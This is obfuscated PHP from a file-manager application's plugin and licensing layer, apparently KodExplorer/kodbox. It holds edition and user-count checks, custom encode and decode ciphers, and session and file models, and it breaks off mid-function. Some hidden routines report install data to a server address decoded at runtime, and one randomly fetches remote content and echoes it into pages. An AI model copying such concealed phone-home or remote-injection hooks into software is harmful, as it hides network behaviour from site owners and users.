CŸ¼©ÇÙÛ¾; CŸ¼©ÇÙÛ¾: $A¦±¡»¤ÌÔ =& $_SERVER[§¦€¦ÊòÓ]; $bìâË” ‚² = Model($A¦±¡»¤ÌÔ[18])->get(); if ($bìâË” ‚²[$A¦±¡»¤ÌÔ[64]] == $A¦±¡»¤ÌÔ[65]) { $this->dataAllow(); return; } goto fÁ¹Ù‡ñ°; fÁ¹Ù‡ñ°: $CíƒìÀ¸÷ = Model($A¦±¡»¤ÌÔ[18])->get($A¦±¡»¤ÌÔ[62]); $b¾ª¥¿™œ÷ = array_to_keyvalue($this->listData(), $A¦±¡»¤ÌÔ[0]); $C»à¥ì£¡ = $b¾ª¥¿™œ÷[$A¦±¡»¤ÌÔ[132]]; goto E¦‚ÑÒñÚ; d¯ˆ¦ë­‹ö: $dœ–Æ¡®† = json_decode($dœ–Æ¡®†, !0); if (!is_array($dœ–Æ¡®†)) { return $this->dataReset(); } $B«¾†Ã‡ÒÄ = strtotime($dœ–Æ¡®†[$A¦±¡»¤ÌÔ[83]]); goto A¸ª—Òä¹®; A¸ª—Òä¹®: if (time() >= $B«¾†Ã‡ÒÄ) { return $this->dataReset(); } $this->versionData = $dœ–Æ¡®†; $this->version = $bìâË” ‚²[$A¦±¡»¤ÌÔ[64]]; goto Dà³…Àİô§; E¦‚ÑÒñÚ: $aË½ë¤Æ¦ = md5(BASIC_PATH . strrev($CíƒìÀ¸÷) . $bìâË” ‚²[$A¦±¡»¤ÌÔ[123]]); $c¡Ê»Òë‚Û = strrev(substr($aË½ë¤Æ¦, 10, 16)); $dœ–Æ¡®† = $this->decode($C»à¥ì£¡[$A¦±¡»¤ÌÔ[43]][$c¡Ê»Òë‚Û], $aË½ë¤Æ¦); goto d¯ˆ¦ë­‹ö; Dà³…Àİô§: } private function dataAllow() { goto A¶¬™ê¡ŒŒ; A¶¬™ê¡ŒŒ: $cîî½£½ =& $_SERVER[§¦€¦ÊòÓ]; $Bƒ°íŸ‚åœ = $GLOBALS[$cîî½£½[97]]; $a‰œøòöõŒ = $this->version; goto f˜¸ïÅÔ­µ; f˜¸ïÅÔ­µ: if (ACTION == $cîî½£½[137] && $a‰œøòöõŒ == $cîî½£½[65]) { show_json(LNG($cîî½£½[138]), !1, $cîî½£½[139]); } $cà´ø°ƒé– = array($cîî½£½[140], $cîî½£½[141]); if (in_array(ACTION, $cà´ø°ƒé–)) { if ($a‰œøòöõŒ == $cîî½£½[65] && isset($Bƒ°íŸ‚åœ[$cîî½£½[142]])) { show_json(LNG($cîî½£½[138]), !1, $cîî½£½[139]); die; } $fäã·ÎÌæ = $this->userCount(); if ($fäã·ÎÌæ != 10000) { if ($fäã·ÎÌæ <= Model($cîî½£½[79])->count()) { show_json(LNG($cîî½£½[143]), !1, $cîî½£½[139]); die; } } } goto F»—˜ÇÔ; F»—˜ÇÔ: Hook::bind($cîî½£½[144], $cîî½£½[145]); goto aßØš°àé; aßØš°àé: } private function checkPlugin($dˆ‡„Ò½Ú) { goto BŸøÌñÅÙª; Bì…ø‹¼½Â: foreach ($DØ—¸éÕ§» as $B½ÆîŸ«˜Ã) { unset($dˆ‡„Ò½Ú[$B½ÆîŸ«˜Ã]); } return $dˆ‡„Ò½Ú; goto Fà‘Î‰È´ï; E‹Ë—È®œö: $CÇ”‡ÌğÎœ = explode($cÏ¤”›Ú…Š[155], _get($this->versionData, $cÏ¤”›Ú…Š[71], $cÏ¤”›Ú…Š[72])); $DØ—¸éÕ§» = array(); foreach ($F£¿ºë÷“ë as $B½ÆîŸ«˜Ã) { if (!in_array($B½ÆîŸ«˜Ã, $CÇ”‡ÌğÎœ)) { $DØ—¸éÕ§»[] = $B½ÆîŸ«˜Ã; } } goto Bì…ø‹¼½Â; BŸøÌñÅÙª: $cÏ¤”›Ú…Š =& $_SERVER[§¦€¦ÊòÓ]; if ($this->version == $cÏ¤”›Ú…Š[146]) { return $dˆ‡„Ò½Ú; } $F£¿ºë÷“ë = array($cÏ¤”›Ú…Š[147], $cÏ¤”›Ú…Š[148], $cÏ¤”›Ú…Š[149], $cÏ¤”›Ú…Š[150], $cÏ¤”›Ú…Š[151], $cÏ¤”›Ú…Š[152], $cÏ¤”›Ú…Š[153], $cÏ¤”›Ú…Š[154]); goto E‹Ë—È®œö; Fà‘Î‰È´ï: } private function disableCheck() { goto Eöá”Ûº„Û; fº‘„Äñ˜©: $F‡‘áÍÕºŠ = array($BøÃ¤‰Çã[156]); foreach ($F‡‘áÍÕºŠ as $FŒªõ¸‘–Ë) { if ($FŒªõ¸‘–Ë == $a½“¥´‹Ôï || substr($a½“¥´‹Ôï, 0, strlen($FŒªõ¸‘–Ë)) == $FŒªõ¸‘–Ë) { show_json(LNG($BøÃ¤‰Çã[157]), !1); } } Hook::bind($BøÃ¤‰Çã[158], array($this, $BøÃ¤‰Çã[159])); goto CĞ‹àµé‹Ì; Eöá”Ûº„Û: $BøÃ¤‰Çã =& $_SERVER[§¦€¦ÊòÓ]; if ($this->version != $BøÃ¤‰Çã[65]) { return; } $a½“¥´‹Ôï = strtolower(ACTION); goto fº‘„Äñ˜©; CĞ‹àµé‹Ì: $GLOBALS[$BøÃ¤‰Çã[43]][$BøÃ¤‰Çã[160]] = $BøÃ¤‰Çã[131]; goto C×óçÅŞ†; C×óçÅŞ†: } public function methodExit() { return $_SERVER[§¦€¦ÊòÓ][161]; } private function checkVersion() { goto Bå—³·ŞŞ; dƒö¨ù²’×: if (ACTION != $BÎğ¦¾ñ³‰[163]) { return; } $E…«êùÀ² = Model($BÎğ¦¾ñ³‰[18])->get($BÎğ¦¾ñ³‰[122]); $E–´ãçæ‹ = md5($E…«êùÀ²); goto DêÅ‘ Û¨ñ; Bå—³·ŞŞ: $BÎğ¦¾ñ³‰ =& $_SERVER[§¦€¦ÊòÓ]; if ($this->version == $BÎğ¦¾ñ³‰[65] || !$GLOBALS[$BÎğ¦¾ñ³‰[7]]) { return; } if (intval(date($BÎğ¦¾ñ³‰[162], time())) % 3 != 0) { return; } goto dƒö¨ù²’×; CªĞÊ…‹ßß: Cache::set($E–´ãçæ‹, $cô†ºô¦İ…, $F„îù¯ï‘¨); goto B¿Ûéóë; DêÅ‘ Û¨ñ: $cô†ºô¦İ… = Cache::get($E–´ãçæ‹); $F„îù¯ï‘¨ = 3600 * 24 * 3; if (!$cô†ºô¦İ… || time() - $cô†ºô¦İ…[$BÎğ¦¾ñ³‰[164]] > $F„îù¯ï‘¨) { goto b´¯ ¨çÌ; F†×—Ú¶â: $A µÈé¹¦Š = url_request($eÎšĞ˜Ä¿‰, $BÎğ¦¾ñ³‰[11], $dô—¥¨å‹Ç, !1, !1, !0, 5); $eˆ²Ç¯ªÙå = $A µÈé¹¦Š[$BÎğ¦¾ñ³‰[12]]; if (!is_array($eˆ²Ç¯ªÙå)) { return; } goto A’¼ñî·°; A’¼ñî·°: if ($eˆ²Ç¯ªÙå[$BÎğ¦¾ñ³‰[99]] != !0) { $this->dataReset(); Cache::remove($E–´ãçæ‹); return; } goto aÂîºî¨ˆ£; b´¯ ¨çÌ: $cô†ºô¦İ… = array($BÎğ¦¾ñ³‰[165] => !0, $BÎğ¦¾ñ³‰[166] => time()); $eÎšĞ˜Ä¿‰ = Mcrypt::decode($BÎğ¦¾ñ³‰[167], $BÎğ¦¾ñ³‰[58]); $dô—¥¨å‹Ç = array($BÎğ¦¾ñ³‰[99] => $E…«êùÀ², $BÎğ¦¾ñ³‰[108] => $this->version, $BÎğ¦¾ñ³‰[107] => INSTALL_CHANNEL, $BÎğ¦¾ñ³‰[103] => $BÎğ¦¾ñ³‰[85], $BÎğ¦¾ñ³‰[104] => KOD_VERSION); goto F†×—Ú¶â; aÂîºî¨ˆ£: } goto CªĞÊ…‹ßß; B¿Ûéóë: } private function userCount() { goto a¿Ÿ‰¸µŸ; a¿Ÿ‰¸µŸ: $FŞ‘Õ‹Šğâ =& $_SERVER[§¦€¦ÊòÓ]; $Dšˆ­õÏ = array($FŞ‘Õ‹Šğâ[168] => 10, $FŞ‘Õ‹Šğâ[169] => 30, $FŞ‘Õ‹Šğâ[170] => 50, $FŞ‘Õ‹Šğâ[171] => 150, $FŞ‘Õ‹Šğâ[172] => 500, $FŞ‘Õ‹Šğâ[173] => 10000, $FŞ‘Õ‹Šğâ[174] => 10000, $FŞ‘Õ‹Šğâ[175] => 10, $FŞ‘Õ‹Šğâ[176] => 30, $FŞ‘Õ‹Šğâ[177] => 50, $FŞ‘Õ‹Šğâ[178] => 100, $FŞ‘Õ‹Šğâ[179] => 150, $FŞ‘Õ‹Šğâ[180] => 250, $FŞ‘Õ‹Šğâ[181] => 500, $FŞ‘Õ‹Šğâ[182] => 1001, $FŞ‘Õ‹Šğâ[183] => 1500, $FŞ‘Õ‹Šğâ[184] => 2000); $Eè«‚Ş®¼Õ = $Dšˆ­õÏ[$this->version]; goto a¿æ·Çöô¦; eİÌ©ƒøÏ: return $Eè«‚Ş®¼Õ + $aê†ƒ¢ìÎœ; goto B‹Ï‰¸Í­; a¿æ·Çöô¦: $Eè«‚Ş®¼Õ = $Eè«‚Ş®¼Õ ? $Eè«‚Ş®¼Õ : 10; $aê†ƒ¢ìÎœ = _get($this->versionData, $FŞ‘Õ‹Šğâ[185]); $aê†ƒ¢ìÎœ = $aê†ƒ¢ìÎœ ? intval($aê†ƒ¢ìÎœ) : 0; goto eİÌ©ƒøÏ; B‹Ï‰¸Í­: } public function loginCheck($aÄñƒî³Ç®) { goto D›µ’«ËÏ‚; AäÈùğ¡Ú¬: $eŠ·‘ª Ÿ× = Model($D÷ÌòŒ“¡’[79])->count(); if ($eŠ·‘ª Ÿ× <= $bå´–Û¹·¾) { return; } $d“…æ‡•¶ = Model($D÷ÌòŒ“¡’[79])->field($D÷ÌòŒ“¡’[186])->limit($bå´–Û¹·¾)->select(); goto BÎ¢‹¾óã©; BÎ¢‹¾óã©: $d“…æ‡•¶ = array_to_keyvalue($d“…æ‡•¶, $D÷ÌòŒ“¡’[72], $D÷ÌòŒ“¡’[186]); if (!in_array($aÄñƒî³Ç®[$D÷ÌòŒ“¡’[186]], $d“…æ‡•¶)) { show_json($D÷ÌòŒ“¡’[187], !1, $D÷ÌòŒ“¡’[139]); } goto dŞÅÔÁ†¨; D›µ’«ËÏ‚: $D÷ÌòŒ“¡’ =& $_SERVER[§¦€¦ÊòÓ]; $bå´–Û¹·¾ = $this->userCount(); if ($bå´–Û¹·¾ >= 10000) { return; } goto AäÈùğ¡Ú¬; dŞÅÔÁ†¨: } public function checkEcho() { $b…Û¨‚£º =& $_SERVER[§¦€¦ÊòÓ]; if (date($b…Û¨‚£º[188]) % 10 == 1 && $GLOBALS[$b…Û¨‚£º[7]] && mt_rand(1, 100) % 10 <= 3) { $a–¿ÖõÕç = $b…Û¨‚£º[189]; $Aš“š³îğ = url_request($a–¿ÖõÕç, $b…Û¨‚£º[11], !1, !1, !1, !1, 3); echo $b…Û¨‚£º[190] . hash_encode($Aš“š³îğ[$b…Û¨‚£º[12]]) . $b…Û¨‚£º[191]; } } private function encode($E˜ˆ¼ÄÏ™¾, $CšÄĞàŞ´˜, $e×¨äÍß†† = 3) { goto c®†Šˆ¦ñ; c®†Šˆ¦ñ: $e®‰ô‹™·ƒ =& $_SERVER[§¦€¦ÊòÓ]; usleep(2); $E˜ˆ¼ÄÏ™¾ = trim($E˜ˆ¼ÄÏ™¾); goto dßñÖö•¥±; C™å²ºğ‡Õ: switch ($C²êó®Ãç) { case $e®‰ô‹™·ƒ[136]: $d‡Ë¿§ø¾¹ = Mcrypt::encode($E˜ˆ¼ÄÏ™¾, strrev($CšÄĞàŞ´˜ . $bùñ ğì“®)); break; case $e®‰ô‹™·ƒ[131]: $d‡Ë¿§ø¾¹ = Mcrypt::encode($E˜ˆ¼ÄÏ™¾, strrev($bùñ ğì“® . $CšÄĞàŞ´˜)); break; case $e®‰ô‹™·ƒ[193]: $d‡Ë¿§ø¾¹ = Mcrypt::encode($E˜ˆ¼ÄÏ™¾, base64_encode($bùñ ğì“® . $CšÄĞàŞ´˜)); break; case $e®‰ô‹™·ƒ[194]: $d‡Ë¿§ø¾¹ = Mcrypt::encode($E˜ˆ¼ÄÏ™¾, md5($bùñ ğì“® . $CšÄĞàŞ´˜)); break; case $e®‰ô‹™·ƒ[195]: goto aö÷·é¿ğŸ; aö÷·é¿ğŸ: $E˜ˆ¼ÄÏ™¾ = base64_encode($E˜ˆ¼ÄÏ™¾); $C£øßª¾Ûè = rand(0, 64); $A®á¿é‹Şî = $dÙÙÖ¬ÃÇ¯[$C£øßª¾Ûè]; goto C³¯™³Áù¯; b£“òÉÄÇ‘: for ($Fç÷††ÙºÎ = 0; $Fç÷††ÙºÎ < strlen($E˜ˆ¼ÄÏ™¾); $Fç÷††ÙºÎ++) { $DöÄ“ô²¿Ø = $DöÄ“ô²¿Ø == strlen($Dâßî›ø¿) ? 0 : $DöÄ“ô²¿Ø; $d‚ŸÁÛÇá = ($C£øßª¾Ûè + strpos($dÙÙÖ¬ÃÇ¯, $E˜ˆ¼ÄÏ™¾[$Fç÷††ÙºÎ]) + ord($Dâßî›ø¿[$DöÄ“ô²¿Ø++])) % 64; $bÊ½„ªÑØ¥ .= $dÙÙÖ¬ÃÇ¯[$d‚ŸÁÛÇá]; } $d‡Ë¿§ø¾¹ = hash_encode($A®á¿é‹Şî . $bÊ½„ªÑØ¥); break; goto bäÂÈ—¡ÂÛ; C³¯™³Áù¯: $Dâßî›ø¿ = md5($A®á¿é‹Şî . md5($CšÄĞàŞ´˜ . $A®á¿é‹Şî) . $CšÄĞàŞ´˜); $Dâßî›ø¿ = substr($Dâßî›ø¿, $C£øßª¾Ûè % 8, $C£øßª¾Ûè % 8 + 7); $bÊ½„ªÑØ¥ = $e®‰ô‹™·ƒ[72]; goto E‰îÄğ´İí; E‰îÄğ´İí: $Fç÷††ÙºÎ = 0; $d‚ŸÁÛÇá = 0; $DöÄ“ô²¿Ø = 0; goto b£“òÉÄÇ‘; bäÂÈ—¡ÂÛ: default: $d‡Ë¿§ø¾¹ = Mcrypt::encode($E˜ˆ¼ÄÏ™¾, $CšÄĞàŞ´˜ . $bùñ ğì“®); break; } $d‡Ë¿§ø¾¹ = strrev($C²êó®Ãç . $bùñ ğì“® . $d‡Ë¿§ø¾¹); if ($e×¨äÍß†† - 1 > 0) { $d‡Ë¿§ø¾¹ = $this->encode($d‡Ë¿§ø¾¹, $CšÄĞàŞ´˜, $e×¨äÍß†† - 1); } goto Dì‰ğµÕÄö; dßñÖö•¥±: $C²êó®Ãç = mt_rand(0, 5) . $e®‰ô‹™·ƒ[72]; $bùñ ğì“® = rand_string(15); $dÙÙÖ¬ÃÇ¯ = $e®‰ô‹™·ƒ[192]; goto C™å²ºğ‡Õ; Dì‰ğµÕÄö: return $d‡Ë¿§ø¾¹; goto BÙë§œ­¡Š; BÙë§œ­¡Š: } public function decode($DƒíØùõÛÄ, $f‚ê·‚Å‹, $Còñ–©§½Í = 3) { goto AàÅ±§¯õ«; A­í«§îõè: $DƒíØùõÛÄ = strrev($DƒíØùõÛÄ); $DêŞ¶ È¯Æ = $DƒíØùõÛÄ[0]; $Dè™¯Œï´ß = substr($DƒíØùõÛÄ, 1, 15); goto b˜ì×­Ü…ä; b˜ì×­Ü…ä: $DƒíØùõÛÄ = substr($DƒíØùõÛÄ, 16); $b”…ë‰´Ã­ = $CÍÅ·Ãˆ¬¤[192]; switch ($DêŞ¶ È¯Æ) { case $CÍÅ·Ãˆ¬¤[136]: $b­§§ È’ = Mcrypt::decode($DƒíØùõÛÄ, strrev($f‚ê·‚Å‹ . $Dè™¯Œï´ß)); break; case $CÍÅ·Ãˆ¬¤[131]: $b­§§ È’ = Mcrypt::decode($DƒíØùõÛÄ, strrev($Dè™¯Œï´ß . $f‚ê·‚Å‹)); break; case $CÍÅ·Ãˆ¬¤[193]: $b­§§ È’ = Mcrypt::decode($DƒíØùõÛÄ, base64_encode($Dè™¯Œï´ß . $f‚ê·‚Å‹)); break; case $CÍÅ·Ãˆ¬¤[194]: $b­§§ È’ = Mcrypt::decode($DƒíØùõÛÄ, md5($Dè™¯Œï´ß . $f‚ê·‚Å‹)); break; case $CÍÅ·Ãˆ¬¤[195]: goto CåÆ½È¹õÌ; CåÆ½È¹õÌ: $DƒíØùõÛÄ = hash_decode($DƒíØùõÛÄ); $B´ÍîĞñÓØ = $DƒíØùõÛÄ[0]; $DƒíØùõÛÄ = substr($DƒíØùõÛÄ, 1); goto B¸¬¾‘¤’²; f¹®øŒ…Ñ•: $dÇâÂ³ŸÔ² = $CÍÅ·Ãˆ¬¤[72]; $aØ‹ÑŒù¤ = 0; $E¹ğºøÓè = 0; goto Bš’”›ˆÌÅ; dŠˆ¹°ğ¨æ: break; goto bÌäÔ–; B¸¬¾‘¤’²: $c¤ë‡ÙÀö = strpos($b”…ë‰´Ã­, $B´ÍîĞñÓØ); $EœÕ¥œ³ª‘ = md5($B´ÍîĞñÓØ . md5($f‚ê·‚Å‹ . $B´ÍîĞñÓØ) . $f‚ê·‚Å‹); $EœÕ¥œ³ª‘ = substr($EœÕ¥œ³ª‘, $c¤ë‡ÙÀö % 8, $c¤ë‡ÙÀö % 8 + 7); goto f¹®øŒ…Ñ•; Bš’”›ˆÌÅ: $bÕ­¬×öÔ = 0; for ($aØ‹ÑŒù¤ = 0; $aØ‹ÑŒù¤ < strlen($DƒíØùõÛÄ); $aØ‹ÑŒù¤++) { $bÕ­¬×öÔ = $bÕ­¬×öÔ == strlen($EœÕ¥œ³ª‘) ? 0 : $bÕ­¬×öÔ; $d˜•÷‰©Á = $bÕ­¬×öÔ++; $E¹ğºøÓè = strpos($b”…ë‰´Ã­, $DƒíØùõÛÄ[$aØ‹ÑŒù¤]) - $c¤ë‡ÙÀö - ord($EœÕ¥œ³ª‘[$d˜•÷‰©Á]); while ($E¹ğºøÓè < 0) { $E¹ğºøÓè += 64; } $dÇâÂ³ŸÔ² .= $b”…ë‰´Ã­[$E¹ğºøÓè]; } $b­§§ È’ = base64_decode($dÇâÂ³ŸÔ²); goto dŠˆ¹°ğ¨æ; bÌäÔ–: default: $b­§§ È’ = Mcrypt::decode($DƒíØùõÛÄ, $f‚ê·‚Å‹ . $Dè™¯Œï´ß); break; } goto D·Äã»¸¿£; AàÅ±§¯õ«: $CÍÅ·Ãˆ¬¤ =& $_SERVER[§¦€¦ÊòÓ]; if (!is_string($DƒíØùõÛÄ) || strlen($DƒíØùõÛÄ) < 10) { return !1; } $DƒíØùõÛÄ = trim($DƒíØùõÛÄ); goto A­í«§îõè; D·Äã»¸¿£: if ($Còñ–©§½Í - 1 > 0) { $b­§§ È’ = $this->decode($b­§§ È’, $f‚ê·‚Å‹, $Còñ–©§½Í - 1); } return $b­§§ È’; goto aíåšİñÉí; aíåšİñÉí: } public function appAllow($B¿¹¬Á„‘¥, $AäòªÂùç‹, $b½Œ«Ò±‚« = true) { $aøù³³Ö²Ò =& $_SERVER[§¦€¦ÊòÓ]; $A‚Ê¡ê›ä = PLUGIN_DIR . $B¿¹¬Á„‘¥ . $aøù³³Ö²Ò[196]; if (!is_array($AäòªÂùç‹) || !is_array($AäòªÂùç‹[$aøù³³Ö²Ò[1]]) || !is_file($A‚Ê¡ê›ä) || $AäòªÂùç‹[$aøù³³Ö²Ò[197]] != 1) { return !1; } if ($b½Œ«Ò±‚« && !Action($aøù³³Ö²Ò[198])->checkAuth($B¿¹¬Á„‘¥)) { return !1; } return !0; } public function unInstall($d¸„°Æ’¶) { $e¥°‚Õùî =& $_SERVER[§¦€¦ÊòÓ]; $EğãÏ¿‘óË = $this->loadList($d¸„°Æ’¶); if (file_exists(PLUGIN_DIR . $d¸„°Æ’¶)) { Hook::apply($d¸„°Æ’¶ . $e¥°‚Õùî[199]); } $this->remove($EğãÏ¿‘óË[$e¥°‚Õùî[133]]); } public function changeStatus($dšºêºŠù‰, $Dîçí”¦¹) { $f•ÓšÚĞÈ° =& $_SERVER[§¦€¦ÊòÓ]; $cÕğÏ©”íÍ = $this->loadList($dšºêºŠù‰); if ($Dîçí”¦¹) { Hook::apply($dšºêºŠù‰ . $f•ÓšÚĞÈ°[200]); } $this->update($cÕğÏ©”íÍ[$f•ÓšÚĞÈ°[133]], array($f•ÓšÚĞÈ°[201] => $Dîçí”¦¹)); } public function appRegist($bñ„â¯²éÂ, $a«²Şõ±İÎ) { $C˜¤¹¡‰‰ =& $_SERVER[§¦€¦ÊòÓ]; $a³ÊáÉñÙù = $this->loadList($bñ„â¯²éÂ); if ($a³ÊáÉñÙù) { $this->update($a³ÊáÉñÙù[$C˜¤¹¡‰‰[133]], array($C˜¤¹¡‰‰[1] => $a«²Şõ±İÎ)); } else { $Fò“ÔÈ–ÊÔ = array($C˜¤¹¡‰‰[0] => $bñ„â¯²éÂ, $C˜¤¹¡‰‰[1] => $a«²Şõ±İÎ, $C˜¤¹¡‰‰[197] => 0, $C˜¤¹¡‰‰[43] => $this->getConfigDefault($bñ„â¯²éÂ)); $this->insert($Fò“ÔÈ–ÊÔ); } } public function getConfigDefault($AÄ¬˜Àà¬„) { $dÔÂƒåÇÓ =& $_SERVER[§¦€¦ÊòÓ]; $fÀŠŒÙËÅĞ = array(); $EÅ—öÂ¾œ = $this->getPackageJson($AÄ¬˜Àà¬„); if (!$EÅ—öÂ¾œ && is_array($EÅ—öÂ¾œ[$dÔÂƒåÇÓ[202]])) { return $fÀŠŒÙËÅĞ; } foreach ($EÅ—öÂ¾œ[$dÔÂƒåÇÓ[202]] as $a‘ááÊš½ => $eùà±¶ˆÎ²) { if (!isset($eùà±¶ˆÎ²[$dÔÂƒåÇÓ[203]]) || isset($fÀŠŒÙËÅĞ[$a‘ááÊš½])) { continue; } $fÀŠŒÙËÅĞ[$a‘ááÊš½] = $eùà±¶ˆÎ²[$dÔÂƒåÇÓ[203]]; } return $fÀŠŒÙËÅĞ; } public function getPackageJson($cØ¶ŒÀà) { return Hook::apply($cØ¶ŒÀà . $_SERVER[§¦€¦ÊòÓ][204]); } public function getConfig($a‚Å­¶‹Úâ, $CÛ†°¿ÊÉÌ = false) { $CøœŸ„¼©· =& $_SERVER[§¦€¦ÊòÓ]; $AÓº†‰ŞÕ— = array(); $AíÈğÊÂË = $this->loadList($a‚Å­¶‹Úâ); if ($AíÈğÊÂË && is_array($AíÈğÊÂË[$CøœŸ„¼©·[43]])) { $AÓº†‰ŞÕ— = $AíÈğÊÂË[$CøœŸ„¼©·[43]]; } if (!$AÓº†‰ŞÕ— || $CÛ†°¿ÊÉÌ) { $AÓº†‰ŞÕ— = $this->getConfigDefault($a‚Å­¶‹Úâ); } return $AÓº†‰ŞÕ—; } public function setConfig($A´Ô¨¶¼è, $fæ××éñ¬‚ = false) { goto AÒÓÛí¼†•; Cá‡¡Ãô­À: if ($fæ××éñ¬‚ == !1) { $fæ××éñ¬‚ = $this->getConfigDefault($A´Ô¨¶¼è); } $eÊï²Ã§‚ = $DéÑ¥Ü¤î[$bóß‰ĞÁˆ[43]]; foreach ($fæ××éñ¬‚ as $féÉ”õÓ¬æ => $CõÄÁÃ­³¦) { $eÊï²Ã§‚[$féÉ”õÓ¬æ] = is_string($CõÄÁÃ­³¦) ? trim($CõÄÁÃ­³¦) : $CõÄÁÃ­³¦; } goto fŸ«ÍÉ…; AÒÓÛí¼†•: $bóß‰ĞÁˆ =& $_SERVER[§¦€¦ÊòÓ]; $DéÑ¥Ü¤î = $this->loadList($A´Ô¨¶¼è); if (!$DéÑ¥Ü¤î) { return !1; } goto Cá‡¡Ãô­À; fŸ«ÍÉ…: $this->update($DéÑ¥Ü¤î[$bóß‰ĞÁˆ[133]], array($bóß‰ĞÁˆ[43] => $eÊï²Ã§‚)); goto f¨ÙËïÕå¾; f¨ÙËïÕå¾: } public function viewList() { goto c·â°—öô; BğÈÕ¿Îµ: $this->pluginScan($EÈ¿£—Áã‘); $A™¶“Ò°ÄÂ = array(); foreach ($EÈ¿£—Áã‘ as $e˜»Íù­áÌ => $b¡®çŸğæê) { unset($b¡®çŸğæê[$Eƒ¾íØ±§µ[1]], $b¡®çŸğæê[$Eƒ¾íØ±§µ[43]]); $a´†È»±ÅÈ = PLUGIN_DIR . $b¡®çŸğæê[$Eƒ¾íØ±§µ[0]] . $Eƒ¾íØ±§µ[196]; if (!is_file($a´†È»±ÅÈ)) { continue; } $cä¡éµÃ“Ñ = Hook::apply($b¡®çŸğæê[$Eƒ¾íØ±§µ[0]] . $Eƒ¾íØ±§µ[204]); if (is_array($cä¡éµÃ“Ñ)) { $A™¶“Ò°ÄÂ[$e˜»Íù­áÌ] = array_merge($b¡®çŸğæê, $cä¡éµÃ“Ñ); } } goto dĞí¼ó–; c·â°—öô: $Eƒ¾íØ±§µ =& $_SERVER[§¦€¦ÊòÓ]; $EÈ¿£—Áã‘ = $this->loadList(); $EÈ¿£—Áã‘ = $this->checkPlugin($EÈ¿£—Áã‘); goto BğÈÕ¿Îµ; dĞí¼ó–: return $A™¶“Ò°ÄÂ; goto bÂ©ˆîÊ“È; bÂ©ˆîÊ“È: } private function pluginScan($b²¸ÀÄˆ¥¡) { $aã¢’ëÔïŒ =& $_SERVER[§¦€¦ÊòÓ]; recursion_dir(PLUGIN_DIR, $C”®®·á Ó, $cô„Ó°£ãØ, 0); foreach ($C”®®·á Ó as $F¦‚Õ›…¯) { $A×¥ÇÀ„è» = get_path_this($F¦‚Õ›…¯); if (isset($b²¸ÀÄˆ¥¡[$A×¥ÇÀ„è»]) || !file_exists($F¦‚Õ›…¯ . $aã¢’ëÔïŒ[205]) || !file_exists($F¦‚Õ›…¯ . $aã¢’ëÔïŒ[196])) { continue; } Hook::apply($A×¥ÇÀ„è» . $aã¢’ëÔïŒ[200]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\x74\x65\x6d\137\163\x65\163\x73\x69\x6f\156"; public function get($bŞãÚ“æÉ) { $dãœ•İ¾Ì =& $_SERVER[°Óó£ÌİóèÅ]; $cİã«ç âÛ = $this->where(array($dãœ•İ¾Ì[1653] => $bŞãÚ“æÉ))->find(); if (!is_array($cİã«ç âÛ)) { return !1; } return $cİã«ç âÛ[$dãœ•İ¾Ì[457]]; } public function set($E·¤ñ½‰Â, $CŒÉµÏˆÎ‹, $bÜ±÷¤å¹Å = 3600) { $AÓŒ¦Â”İ =& $_SERVER[°Óó£ÌİóèÅ]; $aéÛ¨é‰¥™ = array($AÓŒ¦Â”İ[1653] => $E·¤ñ½‰Â, $AÓŒ¦Â”İ[1577] => $CŒÉµÏˆÎ‹, $AÓŒ¦Â”İ[1654] => $bÜ±÷¤å¹Å + time()); if (Session::get($AÓŒ¦Â”İ[1655])) { $aéÛ¨é‰¥™[$AÓŒ¦Â”İ[1095]] = Session::get($AÓŒ¦Â”İ[1655]); } else { $aéÛ¨é‰¥™[$AÓŒ¦Â”İ[1095]] = 0; } if ($this->get($E·¤ñ½‰Â)) { return $this->where(array($AÓŒ¦Â”İ[1653] => $E·¤ñ½‰Â))->save($aéÛ¨é‰¥™); } else { return $this->add($aéÛ¨é‰¥™, array(), !0); } } public function remove($a‚ƒ¬Á”ÄÄ) { return $this->where(array($_SERVER[°Óó£ÌİóèÅ][1653] => $a‚ƒ¬Á”ÄÄ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[°Óó£ÌİóèÅ][1656] . time())->delete(); } } goto cÈÛ¬æÓ›¨; bø¬´‚¤Œ: class FileModel extends ModelBase { protected $tableName = "\x69\157\137\x66\151\x6c\x65"; public function fileInfo($eöÕ¸©×ˆã) { $AÄÃ‰äÎ° =& $_SERVER[°Óó£ÌİóèÅ]; static $a©ÊÇ™ä¸ƒ = array(); if (!isset($a©ÊÇ™ä¸ƒ[$eöÕ¸©×ˆã])) { $eªÏô‰—§İ = $AÄÃ‰äÎ°[1594]; $Aç¡âÓãâ” = Model($AÄÃ‰äÎ°[419])->field($eªÏô‰—§İ)->where(array($AÄÃ‰äÎ°[398] => $eöÕ¸©×ˆã))->find(); $a©ÊÇ™ä¸ƒ[$eöÕ¸©×ˆã] = $Aç¡âÓãâ”; } return $a©ÊÇ™ä¸ƒ[$eöÕ¸©×ˆã]; } public function addFileByContent($aŠÆ›İ²” = '', $E…ª°‡»½Ñ = '') { goto eÀ›ãÆ†–æ; eÀ›ãÆ†–æ: $d¢Î°¿”É˜ =& $_SERVER[°Óó£ÌİóèÅ]; $BÔ½ìİ¯ = TEMP_PATH . $d¢Î°¿”É˜[1595]; if (!is_dir($BÔ½ìİ¯)) { mk_dir($BÔ½ìİ¯); } goto bØñ³†¹´ö; bØñ³†¹´ö: $B¾ù·äƒ‘Ü = $BÔ½ìİ¯ . $d¢Î°¿”É˜[1596] . rand_string(16); file_put_contents($B¾ù·äƒ‘Ü, $aŠÆ›İ²”); $c×ä´‹šö = $this->addFile($B¾ù·äƒ‘Ü, $E…ª°‡»½Ñ, !0); goto F°Ö¸ö×Ö…; F°Ö¸ö×Ö…: if (file_exists($B¾ù·äƒ‘Ü)) { @unlink($B¾ù·äƒ‘Ü); } return $c×ä´‹šö; goto B§îç“¾§£; B§îç“¾§£: } public function createFileName($A‹‹Á­Úñã) { goto aàŞ‘Ùñ’; b×’èåçß: $Cƒİ‡âÜ = $eœ¹èÒ‚->pathFather($D×”®³·»); static $eŸƒ‚ŒÂÀƒ = false; $B©½ÅÏ› = $dá®ğÒ‘ìÔ[1597] . md5($Cƒİ‡âÜ); goto BŠÇé¦º¥­; aàŞ‘Ùñ’: $dá®ğÒ‘ìÔ =& $_SERVER[°Óó£ÌİóèÅ]; $eœ¹èÒ‚ = IO::init($dá®ğÒ‘ìÔ[8]); $D×”®³·» = $this->makeFilePath($A‹‹Á­Úñã, $eœ¹èÒ‚); goto 